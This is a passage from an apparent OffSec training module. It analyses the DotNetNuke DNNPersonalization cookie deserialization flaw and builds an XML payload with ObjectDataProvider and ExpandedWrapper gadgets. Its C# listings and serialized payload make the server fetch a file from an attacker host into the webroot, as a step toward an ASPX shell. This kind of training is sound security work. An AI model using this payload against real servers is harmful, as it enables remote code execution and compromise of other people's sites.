Furthermore, we will also use the dnSpy debugger to see exactly how our payloads are being processed. While we are already familiar with Burp and its setup, we need to spend a bit of time on the dnSpy mechanics. Please refer to the videos in order to see the following process in detail.

In order to properly debug DNN, we will need to attach our debugger (_Debug_ > _Attach_ menu entry) to the w3wp.exe process. This is the IIS worker process under which our instance of DNN is running. Please note that if you are unable to see the w3wp.exe process in the _Attach to Process_ dialog box (Figure 14) in dnSpy, you simply need to browse to the DNN instance using a web browser. This will trigger IIS to start the appropriate worker process. You will then be able to see the w3wp.exe instance in the dialog box after clicking on the _Refresh_ button.

![Figure 14: Debugging the w3wp.exe process](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/919f3c2172664d81f213e77cbcd77e52-Picture9.png)

Figure 14: Debugging the w3wp.exe process

Once we attach to our process, the first thing we need to do is pause its execution using the appropriate _Debug_ menu option or the shortcut menu button. We then need to access _Debug_ > _Windows_ > _Modules_ to list all the modules loaded by our w3wp.exe process.

![Figure 15: Listing of loaded modules](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/fdc5cf54234b6e3e46eebdbf90bf2db4-Picture45.png)

Figure 15: Listing of loaded modules

By right-clicking on any of the listed modules, we can access the _Open All Modules_ context menu. This will then load all available modules in the _Assembly Explorer_ pane, which will allow us to easily access and decompile any DNN class we would like to investigate.

![Figure 16: Loading all relevant DNN modules into dnSpy](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/987954a7ff3a2a8e888dd9c989c1a8d8-Picture46.png)

Figure 16: Loading all relevant DNN modules into dnSpy

Once the modules are loaded, we can navigate to the _LoadProfile(int,int)_ function implementation located in the _DotNetNuke.Services.Personalization.PersonalizationController_ namespace in the DotNetNuke.dll assembly. We can then set a breakpoint on line 24, where our initial analysis started.

![Figure 17: Setting the inital breakpoint](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/e8ac0161195cbbc11ac3593ab24d8174-Picture8.png)

Figure 17: Setting the inital breakpoint

We are finally ready to send our first proof-of-concept HTTP request. We can do that by selecting a captured unauthenticated request from our Burp history and sending it to the Repeater tab, where we will add the DNNPersonalization cookie. We also need to remember to change the URL path in our request to a nonexistent page. Our PoC request should look similar to the one below.

![Figure 18: Our first proof-of-concept request](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/f7560aac1d7d3f5fb6c980b230526c89-Picture10.png)

Figure 18: Our first proof-of-concept request

If everything has gone as planned, we should hit our breakpoint in dnSpy after we send our request as shown below.

![Figure 17: Our first breakpoint is triggered](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/884ee7897ec802fc3246d21146db9a2a-Picture11.png)

Figure 17: Our first breakpoint is triggered

#### Exercise

After setting a breakpoint on the vulnerable _LoadProfile_ function, send a proof-of-concept request as described in the previous section and make sure you can reach it.

### 4.2.4. How Did We Get Here?

Although we have trusted the original advisory blindly and were able to validate that we can indeed trigger the _LoadProfile_ function, as researchers we were still missing something. Specifically, it is unusual to see any sort of personalization data being processed when it is originating from an unauthenticated perspective. Furthermore, we wanted to have an idea of what sort of functions were involved during the processing of the HTTP request that triggers the vulnerability. So we dug a little deeper.

Once we hit our initial break point, we can see the following, somewhat imposing call stack:

![Figure 19: LoadProfile callstack](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/8f61db03beb9bdcce07894aa18495962-Picture37.png)

Figure 19: LoadProfile callstack

If we look backwards a couple of steps from the top of the call stack in Figure 19, we see that the _getter_ for the _UserMode_ property of the _PortalSettings_ class is invoked. This _getter_ function has a slightly complex implementation as can be seen in the figure below.

![Figure 20: Implementation of the PortalSettings.UserMode getter.](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/2511ac707a4d3e932e769229deb4e430-Picture38.png)

Figure 20: Implementation of the PortalSettings.UserMode getter.

We can see that the call to the _Personalization.GetProfile_ method, the next entry in the call stack, is located on line 925. We can set a breakpoint on line 926 and resend our proof of concept request in order to verify that we can reach this call.

Notice that our breakpoint, which has been hit as part of the processing of our _unauthenticated_ request, is located inside the _if_ statement. However, one of the _if_ statement conditions in this case is a check of the _HttpContext.Current.Request.IsAuthenticated_ boolean variable, as can be seen on line 922. This is curious as we clearly are not using any authentication or session cookies in our request, yet our request is treated as authenticated.

In order to find out why that is, we need to look back at Figure 19 and notice that closer to the bottom of the call stack, there is a call to a function named _AdvancedUrlReWriter.Handle404OrException_. After tracing the code execution a few times, we discovered the root cause of the issue.

![Figure 21: The 404 request handler contains a HttpContext.User check](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/9130879dc1a1324b5340f7ac887ab04c-Picture39.png)

Figure 21: The 404 request handler contains a HttpContext.User check

Although the implementation of this function is rather long and complex, we are concerned with an instance in which the _HttpContext.User_ property is checked. As we can see in Figure 21, if the _User_ property of the request is _null_, then it gets assigned the value of the current thread user.

The consequences of this code execution path are shown in the following figure:

![Figure 22: Our unauthenticated http request becomes authenticated](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/9d929b826e6a28a76eeea2bedfa78960-Picture40.png)

Figure 22: Our unauthenticated http request becomes authenticated

The boolean variable _IsAuthenticated_ now indicates that its value is "true" and that the request is authenticated under the "IIS\ APPPOOL" group. The reasoning for this logic appears to lie in the fact that the 404 handler is invoked _before_ the _HttpContext.User_ object is set. Since the continued processing of the given request depends on the _User.IsAuthenticated_ property, the developers are ensuring that no null references will occur by setting the _User_ object to the _WindowsPrinicipal_ object of the currently running thread. Now that we have completed our analysis of the vulnerability itself and have a working environment properly set up, it is time to consider how we can exploit this situation and what payload options we have at our disposal.

## 4.3. Payload Options

As we are dealing with a deserialization vulnerability, our goal is to find an object that can execute code that we can use for our purposes and that we can properly deserialize. So, let's look at some options.

### 4.3.1. FileSystemUtils PullFile Method

According to the original advisory, the DotNetNuke.dll assembly contains a class called _FileSystemUtils_. Furthermore, this class implements a method called _PullFile_. If we use the dnSpy search function, we can easily locate this function and look at its implementation.

![Figure 23: Searching for the PullFile function](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/9ed5c430c3b451f72cb73fa0d6f45196-Picture13.png)

Figure 23: Searching for the PullFile function

![Figure 24: PullFile function implementation](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/a2f093359723c14cc5234066a299acbe-Picture14.png)

Figure 24: PullFile function implementation

As we can see in Figure 24, this function could be very useful to us from an attacker perspective, as it allows us to download an arbitrary file from a given URL to the target server. This means that if we can trigger this method using the _DNNPersonalization_ cookie, we could theoretically upload an ASPX shell and gain code execution on our target server.

But before we proceed, we need to remember the limitations of _XmlSerializer_. Although this class is within the DNN application domain and would therefore be known to the serializer at runtime, _XmlSerializer_ can _not_ serialize class methods. It can only serialize public properties and fields. Unfortunately, the _FileSystemUtils_ class does not expose any public properties that we could _set_ or _get_ in order to trigger the invocation of the _PullFile_ method. This means that a serialized instance of this object will not bring us any closer to our goal. Therefore, we need to take a different approach.

### 4.3.2. ObjectDataProvider Class

In their presentation, Muñoz and Mirosh also disclosed four .NET deserialization gadgets, or classes that can facilitate malicious activities during the user-controlled deserialization process. The _ObjectDataProvider_ gadget is arguably the most versatile and was leveraged during their DNN exploit presentation. Let's recount those steps and take a deeper look into this class in order to understand why it is so powerful.

According to the official documentation,[1](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fn-local_id_229-1) the _ObjectDataProvider_ class is used when we want to wrap another object into an _ObjectDataProvider_ instance and use it as a binding source. This begs the question: What is a binding source? Once again, if we refer to the official documentation,[2](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fn-local_id_229-2) we find that a binding source is simply an object that provides the programmer with relevant data. This data is then usually bound from its source to a target object such as a _User Interface_ object (TextBox, ComboBox, etc) to display the data itself.[3](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fn-local_id_229-3)

How does _ObjectDataProvider_ help us? If we read more about this class, we can see that it allows us to wrap an arbitrary object and use the _MethodName_ property to call a method from a wrapped object, along with the _MethodParameters_ property to pass any necessary parameters to the function specified in _MethodName_. The key here is that with the help of the _ObjectDataProvider_ properties (not methods), we can trigger method calls in a completely different object.

This point is worth reiterating once more: by setting the _MethodName_ property of the _ObjectDataProvider_ object instance, we are able to trigger the invocation of that method. The _ObjectDataProvider_ class also does not violate any limitations imposed by _XmlSerializer_, which means that it is an excellent candidate for our payload.

But how exactly does this work? Let's analyze the entire code execution chain in this gadget so that we can gain a better understanding of the mechanics involved.

The _ObjectDataProvider_ is defined and implemented in the _System.Windows.Data_ namespace, which is located in the PresentationFramework.dll .NET executable file. Our Windows operating systems will likely have more than one instance of this file depending on the number of .NET Framework versions installed. For the purposes of this exercise, the one we want to use is located in the C:\Windows\Microsoft.NET\Framework\v4.0.30319\WPF directory.

Based on the information from the official documentation, we need to take a closer look at the _MethodName_ property as this is what triggers the target method in the wrapped object to be called. Once we have decompiled the correct DLL, we can inspect the _MethodName_ _getter_ and _setter_ implementations as shown below.

![Figure 25: ObjectDataProvider MethodName property getter and setter](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/6a956b3404cd511929f19dcd53ea6131-Picture15.png)

Figure 25: ObjectDataProvider MethodName property getter and setter

In Figure 25, we can see that when the _MethodName_ property is set, the private __methodName_ variable is set and ultimately the _base.Refresh_ function call takes place. We'll trace that call.

![Figure 26: Tracing the Refresh function call](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/17965d04c75f1138276f649df78a0695-Picture16.png)

Figure 26: Tracing the Refresh function call

Here (Figure 26) we notice another function call, namely to _BeginQuery_. If we try to follow this execution path by clicking on the function name in dnSpy we will see the following:

![Figure 27: BeginQuery implementation](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/0703521a5075333be9e96a51e17be5b2-Picture17.png)

Figure 27: BeginQuery implementation

This seems to be a dead end, but we need to realize that the _ObjectDataProvider_ class inherits from the _DataSourceProvider_ class, which is where dnSpy took us. Therefore, we need to make sure we navigate to the _BeginQuery_ function implementation within the _ObjectDataProvider_ class that overrides the inherited function.

![Figure 28: Overridden BeginQuery function implementation](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/38e4c8288db96c0fd81ea23dad2eec41-Picture18.png)

Figure 28: Overridden BeginQuery function implementation

At the end of _BeginQuery_ (Figure 28) we can see that there is another call, specifically to the _QueryWorker_ method. As before, we will continue tracing this as well.

![Figure 29: QueryWorker function implementation](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/267e706be6189c9ef037ce314bed4e83-Picture19.png)

Figure 29: QueryWorker function implementation

Finally, in Figure 29, we arrive at a function call to _InvokeMethodOnInstance_ on line 300. This is exactly the point at which the target method in the wrapped object is invoked.

Let's see if we can verify this chain of calls in a simple example project.

1

(Microsoft, 2020), [https://docs.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider?redirectedfrom=MSDN&view=netframework-4.7.2](https://docs.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider?redirectedfrom=MSDN&view=netframework-4.7.2) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fnref-local_id_229-1)

2

(Microsoft, 2017), [https://docs.microsoft.com/en-us/dotnet/framework/wpf/data/how-to-specify-the-binding-source](https://docs.microsoft.com/en-us/dotnet/framework/wpf/data/how-to-specify-the-binding-source) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fnref-local_id_229-2)

3

(Microsoft, 2019), [https://docs.microsoft.com/en-us/dotnet/framework/wpf/data/data-binding-overview](https://docs.microsoft.com/en-us/dotnet/framework/wpf/data/data-binding-overview) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fnref-local_id_229-3)

### 4.3.3. Example Use of the ObjectDataProvider Instance

We will use the following Visual Studio project as the basis for our final serialized payload generator. We will try to reuse as much of the existing DNN code as possible so that we do not have to reinvent the wheel. For this reason, we need to make sure that the DotNetNuke.dll and the PresentationFramework.dll files are added as references to our project, using the same process we described earlier.

![Figure 30: Necessary references are added to our PoC Visual Studio project](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/32fa8dba688686cf924504d0384c3685-Picture20.png)

Figure 30: Necessary references are added to our PoC Visual Studio project

Before continuing, we also need to make sure that we have a webserver available from which we can download an arbitrary file using the DNN vulnerability. We will use our Kali virtual machine for that purpose.

![Figure 31: Using a Kali instance as our webserver](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/4c68576fdb4dfde8fd424183f4689a2e-Picture21.png)

Figure 31: Using a Kali instance as our webserver

With that out of the way, let's look at the following code:

```
01: using System;
02: using System.IO;
03: using System.Xml.Serialization;
04: using DotNetNuke.Common.Utilities;
05: using System.Windows.Data;
06: 
07: namespace ODPSerializer
08: {
09:     class Program
10:     {
11:         static void Main(string[] args)
12:         {
13:             ObjectDataProvider myODP = new ObjectDataProvider();
14:             myODP.ObjectInstance = new FileSystemUtils();
15:             myODP.MethodName = "PullFile";
16:             myODP.MethodParameters.Add("http://192.168.119.120/myODPTest.txt");
17:             myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");
18:             Console.WriteLine("Done!");
19:         }
20:     }
21: }
```

> Listing 18 - Basic application to demonstrate the ObjectDataProvider functionality

In Listing 18 on lines 1-5, we first make sure we set all the appropriate "using" directives to define the required namespaces. Then starting on line 13, we:

- Create a _ObjectDataProvider_ instance
- Instruct it to wrap a DNN _FileSystemUtils_ object
- Instruct it to call the _PullFile_ method
- Pass two arguments to the above mentioned method as required by its constructor

The first argument points to our Kali webserver IP address and the second argument is the path to which the downloaded file should be saved to.

We will compile this application in Visual Studio and debug it using dnSpy. To do so, we will start dnSpy and select the _Start Debugging_ option from the _Debug_ menu. In the _Debug Program_ dialog box, we choose our compiled executable which should be located in the C:\Users\Administrator\source\repos\ODPSerializer\ODPSerializer\bin\Debug\ directory. We then need to ensure that the _Break at_ option is set to "Entry Point".

![Figure 32: Debugging the PoC application](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/aae32ff2fabbc2d1927a397dda10c036-Picture25.png)

Figure 32: Debugging the PoC application

Once we start the debugging session, we should arrive at the following point:

![Figure 33: Hitting the entry point breakpoint in dnSpy](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/76d2e09cf005266009831d42a5b51101-Picture26.png)

Figure 33: Hitting the entry point breakpoint in dnSpy

From here, in the Assembly Explorer (left pane) we will see a number of other assemblies that have been automatically loaded by our process.

As we are trying to verify the _ObjectDataProvider_ analysis we performed earlier, we navigate to the _System.Windows.Data.ObjectDataProvider.QueryWorker_ function implementation inside the _PresentationFramework_ assembly and set a breakpoint on the function call to the _InvokeMethodOnInstance_ method we identified earlier. We will finally let the process execution continue until this breakpoint is hit.

![Figure 34: Our breakpoint on the function call to InvokeMethodOnInstance is triggered](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/376e160567eb4e10dabdac2e62f32bbd-Picture27.png)

Figure 34: Our breakpoint on the function call to InvokeMethodOnInstance is triggered

If we now look at the Call Stack window in dnSpy, we will see that the code execution occurred exactly as expected.

![Figure 35: The ObjectDataProvider MethodName.set call stack confirms the call chain identified during the static analysis](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/7778031deb92d473adacb13a9830c172-Picture28.png)

Figure 35: The ObjectDataProvider MethodName.set call stack confirms the call chain identified during the static analysis

One thing to notice at this point is that if we let the execution of our process continue, we will once again hit this breakpoint. As a matter of fact, this breakpoint will be reached three times. This corresponds to the number of times we are manipulating values related to our ObjectDataProvider instance. First, we set the MethodName property, which triggers the code chain we just analyzed and thus our breakpoint. We then set the MethodParameters values twice which will also trigger the breakpoint albeit with a slightly different call stack.

Finally we can see in our webserver logs that the URL we specified has been reached and that the file C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt on the DNN server has been successfully created.

![Figure 36: Webserver log indicates successful code execution](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/5e462ec2003ec7b2d69439e0f95700ca-Picture29.png)

Figure 36: Webserver log indicates successful code execution

![Figure 37: The PoC file has been created on the DNN server](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/6eb6b46c5bfff2ab61b0d04375ad0154-Picture30.png)

Figure 37: The PoC file has been created on the DNN server

At this point, we have demonstrated that an instance of the _ObjectDataProvider_ class can indeed trigger the _FileSystemUtils.PullFile_ method by simply setting the appropriate properties. Therefore, the only thing left for us to do is attempt to serialize this object and verify that we can trigger the same chain of events during deserialization. If this works, we will then move on and attempt to use the same object in the DNNPersonalization cookie.

#### Exercises

1. Repeat the steps described in the previous section. Use single-step debugging to follow the code execution chain starting with the invocation of the _MethodName_ property setter.
2. Verify that the ObjectDataProvider triggers the method invocation three times in our example. Review the call stack each time in order to understand how they differ.

### 4.3.4. Serialization of the ObjectDataProvider

As we mentioned earlier in this module, our DNNpersonalization cookie payload has to be in the XML format. Since we have already demonstrated how to serialize an object using the _XmlSerializer_ class, we can add that code to our example application from Listing 18. However, based on our earlier analysis we know that the DNNPersonalization cookie has to be in a specific format in order to reach the deserialization function call. Specifically, it has to contain the "profile" node along with the "item" tag, which contains a "type" attribute describing the enclosed object. Rather than trying to reconstruct this structure manually, we can re-use the DNN function that creates that cookie value in the first place. This function is called _SerializeDictionary_ and is located in the _DotNetNuke.Common.Utilities.XmlUtils_ namespace.

![Figure 38: The implementation of the function that creates the DNNPersonalization cookie values](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/559b6df0ce7b00de5a995bc1a6f217c2-Picture31.png)

Figure 38: The implementation of the function that creates the DNNPersonalization cookie values

With that in mind, we will adjust our application source code to look like the following:

```
01: using System;
02: using System.IO;
03: using System.Xml.Serialization;
04: using DotNetNuke.Common.Utilities;
05: using System.Windows.Data;
06: using System.Collections;
07: 
08: namespace ODPSerializer
09: {
10:     class Program
11:     {
12:         static void Main(string[] args)
13:         {
14:             ObjectDataProvider myODP = new ObjectDataProvider();
15:             myODP.ObjectInstance = new FileSystemUtils();
16:             myODP.MethodName = "PullFile";
17:             myODP.MethodParameters.Add("http://192.168.119.120/myODPTest.txt");
18:             myODP.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");
19: 
20:             Hashtable table = new Hashtable();
21:             table["myTableEntry"] = myODP;
22:             String payload = "; DNNPersonalization=" + XmlUtils.SerializeDictionary(table, "profile");
23:             TextWriter writer = new StreamWriter("C:\\Users\\Public\\PullFileTest.txt");
24:             writer.Write(payload);
25:             writer.Close();
26: 
27:             Console.WriteLine("Done!");
28:         }
29:     }
30: }
```

> Listing 19 - Serialization of the ObjectDataProvider instance

Starting on line 20 in Listing 19, we create a _HashTable_ instance and proceed by adding an entry called "myTableEntry" to which we assign our _ObjectDataProvider_ instance. We then use the DNN function to serialize the entire object while providing the required "profile" node name. Finally, we prepend the cookie name to the resulting string and save the final cookie value to a file.

If we compile the new proof of concept and run it under the dnSpy debugger we will be greeted with the following message:

![Figure 39: A serialization error occurs when we try to serialize our object](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/55bf6dc9bb3ad20a87a884ffdac78595-Picture32.png)

Figure 39: A serialization error occurs when we try to serialize our object

If we drill down to the __innerException_ > __message_ value of the exception variable, we can see that the serializer did not expect the _FileSystemUtils_ class instance (Figure 40).

![Figure 40: Details of the thrown exception](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/4a4e6a1492b02860903aa8a3bf756a21-Picture33.png)

Figure 40: Details of the thrown exception

The reason this is happening is due to the way the _XmlSerializer_ is instantiated in the _SerializeDictionary_ function. If we refer to Figure 38, the _XmlSerializer_ instance is created using whatever object type is returned by the _GetType_ method on the object that was passed into the _SerializeDictionary_ function. Since we are passing an _ObjectDataProvider_ instance, this is the type the _XmlSerializer_ will expect. It will have no knowledge of the object type that is wrapped in the _ObjectDataProvider_ instance, which in our case is a _FileSystemUtils_ object. Therefore the serialization fails.

It is important to note that we could in theory fix this issue by instantiating the _XmlSerializer_ using a different constructor prototype, namely one that informs the _XmlSerializer_ about the wrapped object type. The instantiation would then look similar to this:

```
XmlSerializer xmlSerializer = new XmlSerializer(myODP.GetType(), new Type[] {typeof(FileSystemUtils)});
```

> Listing 20 - Modification to the XmlSerializer instantiation to inform it about the wrapped object type

However, this would not help us because the _XmlSerializer_ instance inside the vulnerable DNN function would process the serialized object with the default constructor, i.e. it would not account for the additional object type generating the same error shown in Figure 40.

The bottom line for us is that we cannot successfully serialize our object using the DNN _SerializeDictionary_ function. This means that we need to consider the use of a different object that can help us achieve our goal, namely invocation of the _PullFile_ method.

We'll tackle that problem next.

### 4.3.5. Enter The Dragon (ExpandedWrapper Class)

As a solution to the problem we described in the previous section, Muñoz and Mirosh suggested that the _ExpandedWrapper_ class could be used to finalize the construction of a malicious payload. While that sounded good in theory, we found ourselves lacking details about how exactly this solution worked. Our assumption was that looking up the official documentation would be sufficient. However, in order to fully grasp the mechanics of this approach, a bigger effort is needed.

The official documentation[1](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fn-local_id_232-1) for the ExpandedWrapper class states that:

This class is used internally by the system to implement support for queries with eager loading of related entities. This API supports the product infrastructure and is not intended to be used directly from your code.

This short explanation is not helpful to our understanding in any meaningful way. Furthermore, the explanation of the type parameters in the same document makes everything even more confusing at first. Although there seems to be a lack of publicly available explanations about the specific use-cases for this class, the .NET Framework is open source, which allows us to look at the actual implementation of this class and try to understand what exactly we are dealing with.

While the source code[2](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fn-local_id_232-2) itself is not particularly interesting, the summary information at the beginning of the class implementation provides us with a clue.

<summary>Provides a base class implementing IExpandedResult over projections.</summary>

We are specifically focused on the term "projections". While the concept of projections may be familiar to some software developers, it is necessary for us to review this idea briefly so we can gain a better understanding of what the _ExpandedWrapper_ class does. If we look at the official documentation for the Projection Operations,[3](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fn-local_id_232-3) we learn that a projection is a mechanism by which a particular object is transformed into a different form.

Projections (and expansions) are typically found in the world of data providers and databases. Their primary purpose is to reduce the number of interactions between an application and a backend database relative to the number of queries that are executed. In other words, they facilitate data retrieval using JOIN queries, rather than multiple individual queries.[4](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fn-local_id_232-4)

While the details of this process are outside the scope of this module, there is one aspect of it that is highly relevant to our problem. Specifically, in order to enable the encapsulation of the data retrieved using expansions and projections, data providers need to be able to create objects of arbitrary types. This is accomplished using the _ExpandedWrapper_ class, which represents a generic object type. Most importantly for us, the constructors for this class allow us to specify the object types of the objects that are encapsulated in a given instance. This is exactly what we need to enable the _XmlSerializer_ to serialize an object properly and solve the issue we encountered previously.

In essence, we can use this class to wrap our source object (_ObjectDataProvider_) into a new object type and provide the properties we need (_ObjectDataProvider.MethodName_ and _ObjectDataProvider.MethodParameters_). This set of information is assigned to the _ExpandedWrapper_ instance properties, which will allow them to be serialized by the _XmlSerializer_. Again, this satisfies the _XmlSerializer_ limitations as it cannot serialize class methods, but rather only public properties and fields.

Let's see how that looks in practice.

```
01: using System;
02: using System.IO;
03: using DotNetNuke.Common.Utilities;
04: using System.Collections;
05: using System.Data.Services.Internal;
06: using System.Windows.Data;
07: 
08: namespace ExpWrapSerializer
09: {
10:     class Program
11:     {
12:         static void Main(string[] args)
13:         {
14:             Serialize();
15:         }
16: 
17:         public static void Serialize()
18:         {
19:             ExpandedWrapper<FileSystemUtils, ObjectDataProvider> myExpWrap = new ExpandedWrapper<FileSystemUtils, ObjectDataProvider>();
20:             myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
21:             myExpWrap.ProjectedProperty0.ObjectInstance = new FileSystemUtils();
22:             myExpWrap.ProjectedProperty0.MethodName = "PullFile";
23:             myExpWrap.ProjectedProperty0.MethodParameters.Add("http://192.168.119.120/myODPTest.txt");
24:             myExpWrap.ProjectedProperty0.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");
25: 
26: 
27:             Hashtable table = new Hashtable();
28:             table["myTableEntry"] = myExpWrap;
29:             String payload = XmlUtils.SerializeDictionary(table, "profile");
30:             TextWriter writer = new StreamWriter("C:\\Users\\Public\\ExpWrap.txt");
31:             writer.Write(payload);
32:             writer.Close();
33: 
34:             Console.WriteLine("Done!");
35:         }
36: 
37:     }
38: }
```

> Listing 21 - Serializing an ExpandedWrapper object

In Listing 21 starting on line 19 we can see that instead of using the _ObjectDataProvider_ directly, we are now instantiating an object of type _ExpandedWrapper<FileSystemUtils, ObjectDataProvider>_. Furthermore, we use the generic _ProjectedProperty0_ property to create an _ObjectDataProvider_ instance. The remainder of code should look familiar.

If we compile and execute this code, we will see that there are no exceptions generated during the execution and that our webserver indeed processed a corresponding HTTP request.

The serialized object now looks like this:

```
<profile><item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><ProjectedProperty0><ObjectInstance xsi:type="FileSystemUtils" /><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://192.168.119.120/myODPTest.txt</anyType><anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
```

> Listing 22 - Serialized ExpandedWrapper instance

However, our ultimate goal is to make sure that our serialized object can be properly deserialized within the DNN web application. We can test this quickly in our example application by implementing that functionality.

```
01: using System;
02: using System.IO;
03: using DotNetNuke.Common.Utilities;
04: using DotNetNuke.Common;
05: using System.Collections;
06: using System.Data.Services.Internal;
07: using System.Windows.Data;
08: 
09: namespace ExpWrapSerializer
10: {
11:     class Program
12:     {
13:         static void Main(string[] args)
14:         {
15:             //Serialize();
16:             Deserialize();
17:         }
18: 
19:         public static void Deserialize()
20:         {
21:             string xmlSource = System.IO.File.ReadAllText("C:\\Users\\Public\\ExpWrap.txt");
22:             Globals.DeserializeHashTableXml(xmlSource);
23:         }
24: 
25:         public static void Serialize()
26:         {
27:             ExpandedWrapper<FileSystemUtils, ObjectDataProvider> myExpWrap = new ExpandedWrapper<FileSystemUtils, ObjectDataProvider>();
28:             myExpWrap.ProjectedProperty0 = new ObjectDataProvider();
29:             myExpWrap.ProjectedProperty0.ObjectInstance = new FileSystemUtils();
30:             myExpWrap.ProjectedProperty0.MethodName = "PullFile";
31:             myExpWrap.ProjectedProperty0.MethodParameters.Add("http://192.168.119.120/myODPTest.txt");
32:             myExpWrap.ProjectedProperty0.MethodParameters.Add("C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt");
33: 
34: 
35:             Hashtable table = new Hashtable();
36:             table["myTableEntry"] = myExpWrap;
37:             String payload = XmlUtils.SerializeDictionary(table, "profile");
38:             TextWriter writer = new StreamWriter("C:\\Users\\Public\\ExpWrap.txt");
39:             writer.Write(payload);
40:             writer.Close();
41: 
42:             Console.WriteLine("Done!");
43:         }
44: 
45:     }
46: }
```

> Listing 23 - Testing the DNN deserialization of our ExpandedWrapper object

Notice that in Listing 23 on line 19, we have implemented a simple _Deserialize_ function. This function reads the serialized _ExpandedWrapper_ object we have previously created from a file and uses the native DNN function to start the deserialization process. You will recall that this is the same function that is called in the _LoadProfile_ (Figure 7) function we identified as the entry point for our vulnerability analysis at the beginning of this module.

If we run this compiled application under dnSpy and set a breakpoint on the _InvokeMember_ function call inside _ObjectDataProvider.InvokeMethodOnInstance_, we can indeed validate that the deserialization is proceeding as we hoped for by looking at the call stack (Figure 41).

![Figure 41: Deserialization of the ExpandedWrapper object](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/34ea07badf100cae72715a124ef9f035-Picture34.png)

Figure 41: Deserialization of the ExpandedWrapper object

Moreover Figure 42 shows that the myODPTest.txt file is being downloaded again from our webserver, indicating the _PullFile_ method has been successfully triggered during the deserialization process.

![Figure 42: Webserver log indicates successful code execution during deserialization](https://static.offsec.com/offsec-courses/WEB-300/images/dnn/6b58ec62ed72af612d03557e78501b65-Picture29a.png)

Figure 42: Webserver log indicates successful code execution during deserialization

Now that we have constructed and validated a working payload, it is finally time to put everything together and test it against our DNN server.

#### Exercise

Repeat the steps described in the previous section and ensure that the generated payload is working as intended.

1

(Microsoft, 2020), [https://docs.microsoft.com/en-us/dotnet/api/system.data.services.internal.expandedwrapper-2?view=netframework-4.7.2](https://docs.microsoft.com/en-us/dotnet/api/system.data.services.internal.expandedwrapper-2?view=netframework-4.7.2) [↩︎](https://portal.offsec.com/courses/web-300-687/learning/dotnetnuke-cookie-deserialization-rce-10580/wrapping-up-10615/wrapping-up-10707#fnref-local_id_232-1)

2

